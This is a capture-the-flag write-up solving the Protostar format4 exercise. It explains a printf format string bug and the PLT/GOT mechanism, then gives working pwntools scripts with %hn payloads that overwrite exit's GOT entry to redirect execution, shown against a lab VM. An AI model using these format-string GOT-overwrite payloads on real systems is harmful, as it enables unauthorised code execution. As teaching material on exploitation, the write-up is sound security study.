# Format 4

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}

int main(int argc, char **argv)
{
  vuln();
}


```

Vulnerabilty : 
format string vulnerabilty in vuln() due to "printf(buffer)".


Goal : 

modify the execution flow and call the function hello.


The first idea that we can thing is to overwrite the save Eip with the address of hello() but 
since there is a call to exit() the function is not going to ret.


So our goal is change the execution flow of vuln() without exploiting any overflow ,the technique that is use in this scenario
when we cannot overflow or overwrite a return address is to overwrite an address in the global offset table of libc function call after
our vulnerable printf call.

Format4 is dynamically linked which mean that external functions are not in the binary itself whereas statically linked binary contain 
the needed external functions in the binary.
So i'm not going to explain in detail how works the GOT (global offset table) and the PLT (procedure linkage table), but the idea is the following : 

when an external function like  printf is called: 

 1) the next instruction after the call to printf is a jump at a specific location in the plt section (procedure linkage table)<br>
  There is two possibility :<br>
    a) printf has been already called <br>
    b) printf was never called before <br><br>

a) If printf was called before which mean address of printf was already resolve. In this case the next instruction is a jump in the 
GOT (at a specific index) where there is the real address of printf in the libc. Then printf is use !

b) Otherwise if printf is call for the first time, the first instruction is a jump in the plt (after the call printf instruction). 
Once in the plt the next instruction is a jump  in the GOT, since the real address of printf is not resolve.
The next instruction in the GOT is a jump  in the PLT where address of printf will get resolve by _dl_runtime_resolve. 


The plt is basically a trampoline , you can find out what i say by playing with the "test" binary.
By putting breakpoint on the two printf calls you will see that once in the plt you can find two distinct behaviour between the first and second called.


You can also watch the video of liveoverflow to better understand the usage of plt and GOT when an external function is called:

https://www.youtube.com/watch?v=kUk5pw4w0h4



Ok let's come back to our problem ..

So basically when  exit() will be called the first instruction is a jump in the global offset table, so what happen if we can write at this location the address 
of hello().

call exit() => (plt) jump address_of_exit_in_GOT  => (GOT) write the address of hello()
Let's try it : 

we need to : <br>
1- find  the position of our input on the stack  (using the format string) , <br> 
2- then the address of hello() <br>
3- and lastly  know where the called to exit() jump in the GOT.<br>





# find the control position on the stack:



```python

# bruteforce until we found our pattern ("AAAA") on the stack
def find_pos():
  
    for i in range(10): 
        s = ssh(host="192.168.160.128" , user="user", password="user")
        format4 = s.run(["/opt/protostar/bin/format4"])   
        payload = 'AAAA' + "%{}$x".format(i) # payload: AAAA%i$x   print the element on the stack at position i in hex
        format4.sendline(payload)
        output=str(format4.recvline())
        if "41414141" in output: # if we found our pattern print the position  of it
            print("Found position : ",i)
            control_pos=i
            format4.close()
            return
        format4.close()


 output: 
 ....
[+] Opening new channel: ['/opt/protostar/bin/format4']: Done
Found position :  4
[*] Closed SSH channel with 192.168.160.128


```

Ok at the 4th position we control "buffer".

Now let's find the address of hello()

# Address of hello():

```bash
user@protostar:~$ objdump -D /opt/protostar/bin/format4 | grep -i hello
080484b4 <hello>:
```

Finally let's find where we jump after the called to exit() once in the plt.



# Address of exit():

```asm

(gdb) disassemble vuln 
Dump of assembler code for function vuln:
0x080484d2 <vuln+0>:	push   ebp
0x080484d3 <vuln+1>:	mov    ebp,esp
0x080484d5 <vuln+3>:	sub    esp,0x218
0x080484db <vuln+9>:	mov    eax,ds:0x8049730
0x080484e0 <vuln+14>:	mov    DWORD PTR [esp+0x8],eax
0x080484e4 <vuln+18>:	mov    DWORD PTR [esp+0x4],0x200
0x080484ec <vuln+26>:	lea    eax,[ebp-0x208]
0x080484f2 <vuln+32>:	mov    DWORD PTR [esp],eax
0x080484f5 <vuln+35>:	call   0x804839c <fgets@plt>
0x080484fa <vuln+40>:	lea    eax,[ebp-0x208]
0x08048500 <vuln+46>:	mov    DWORD PTR [esp],eax
0x08048503 <vuln+49>:	call   0x80483cc <printf@plt>
0x08048508 <vuln+54>:	mov    DWORD PTR [esp],0x1
0x0804850f <vuln+61>:	call   0x80483ec <exit@plt>
End of assembler dump.

(gdb) b* 0x0804850f
Breakpoint 1 at 0x804850f: file format4/format4.c, line 22.
(gdb) r
Starting program: /opt/protostar/bin/format4 
AAAA
AAAA
Breakpoint 1, 0x0804850f in vuln () at format4/format4.c:22
22	in format4/format4.c
(gdb) si <----- alias for step inside 
0x080483ec in exit@plt ()
(gdb) x/10i 0x080483ec  <----- we disassemble 10 instruction from the executed instruction
0x80483ec <exit@plt>:	jmp    DWORD PTR ds:0x8049724     <---------the line that interested us
0x80483f2 <exit@plt+6>:	push   0x30
0x80483f7 <exit@plt+11>:	jmp    0x804837c
0x80483fc:	add    BYTE PTR [eax],al
0x80483fe:	add    BYTE PTR [eax],al
0x8048400 <_start>:	xor    ebp,ebp
0x8048402 <_start+2>:	pop    esi
0x8048403 <_start+3>:	mov    ecx,esp
0x8048405 <_start+5>:	and    esp,0xfffffff0
0x8048408 <_start+8>:	push   eax


```
So once we are in the plt after the call to exit we are going to jump in the GOT at 0x8049724.

We can find the same address without analyzing the binary with objdum -TR: 

```bash
user@protostar:~$ objdump -TR /opt/protostar/bin/format4

/opt/protostar/bin/format4:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000  w   D  *UND*	00000000              __gmon_start__
00000000      DF *UND*	00000000  GLIBC_2.0   fgets
00000000      DF *UND*	00000000  GLIBC_2.0   __libc_start_main
00000000      DF *UND*	00000000  GLIBC_2.0   _exit
00000000      DF *UND*	00000000  GLIBC_2.0   printf
00000000      DF *UND*	00000000  GLIBC_2.0   puts
00000000      DF *UND*	00000000  GLIBC_2.0   exit
080485ec g    DO .rodata	00000004  Base        _IO_stdin_used
08049730 g    DO .bss	00000004  GLIBC_2.0   stdin


DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080496fc R_386_GLOB_DAT    __gmon_start__
08049730 R_386_COPY        stdin
0804970c R_386_JUMP_SLOT   __gmon_start__
08049710 R_386_JUMP_SLOT   fgets
08049714 R_386_JUMP_SLOT   __libc_start_main
08049718 R_386_JUMP_SLOT   _exit
0804971c R_386_JUMP_SLOT   printf
08049720 R_386_JUMP_SLOT   puts
08049724 R_386_JUMP_SLOT   exit   <-------------- HERE


```


Now let's make a payload: 



```python



#value  we want to write : address of  hello 0x080484b4 at 0x08049724 address of EXIT in the GOT 



'''
METHOD 1 WRITE 2 BYTES AT ONCE 


0x08049726   0x0804   0x10804 - 0x84b4= 33616x
0x08049724   0x84b4   0x84b4 - 8 = 33964

'''
def write_at_offset4_with_hn():
    address_of_exit_GOT= p32(0x08049724)
    s = ssh(host="192.168.160.128" , user="user", password="user")
    format4 = s.run(["/opt/protostar/bin/format4"]) 
    payload =  p32(0x08049724)+ p32(0x08049726)+  b'%33964x' + b"%4$hn" +  b'%33616x' + b'%5$hn'
    format4.sendline(payload)
    print(format4.recvuntil('win'))
    format4.close()






'''
METHOD 2  WRITE ONLY THE 2 LOWEST BYTES

(gdb) x/10i 0x080483ec
0x80483ec <exit@plt>:	jmp    DWORD PTR ds:0x8049724
0x80483f2 <exit@plt+6>:	push   0x30
0x80483f7 <exit@plt+11>:	jmp    0x804837c
0x80483fc:	add    BYTE PTR [eax],al
0x80483fe:	add    BYTE PTR [eax],al
0x8048400 <_start>:	xor    ebp,ebp
0x8048402 <_start+2>:	pop    esi
0x8048403 <_start+3>:	mov    ecx,esp
0x8048405 <_start+5>:	and    esp,0xfffffff0
0x8048408 <_start+8>:	push   eax
(gdb) x/x 0x8049724
0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x080483f2

 
exit in GOT points at 0x080483f2 (which is in back in the plt  since exit() is not yet resolve )
One thing we should notice is the heigher bytes are already the bytes that we want : 0x0804
We just need to replace the lowest 2 bytes with 0x84b4

payload : address in GOT (4bytes ) +  (0x84b4 - 4)  + "%4$hn"

'''


def write_at_offset4_with_only_one_hn():
    address_of_exit_GOT= p32(0x08049724)
    s = ssh(host="192.168.160.128" , user="user", password="user")
    format4 = s.run(["/opt/protostar/bin/format4"]) 
    payload =  p32(0x08049724) +  b'%33968x' + b"%4$hn"
    format4.sendline(payload)
    print(format4.recvuntil('win'))
    format4.close()






```


And we finally manage to change execution flow of vuln() :

```bash
jeyanthan@pc:~/CTF/PROTOSTAR/format/Format4$ python3 exploit.py 
[+] Connecting to 192.168.160.128 on port 22: Done
[*] user@192.168.160.128:
    Distro    Unknown Unknown
    OS:       Unknown
    Arch:     Unknown
    Version:  0.0.0
    ASLR:     Disabled
    Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
[+] Opening new channel: ['/opt/protostar/bin/format4']: Done
b'$\x97\x04\x08      
code execution redirected! you win
[*] Closed SSH channel with 192.168.160.128

```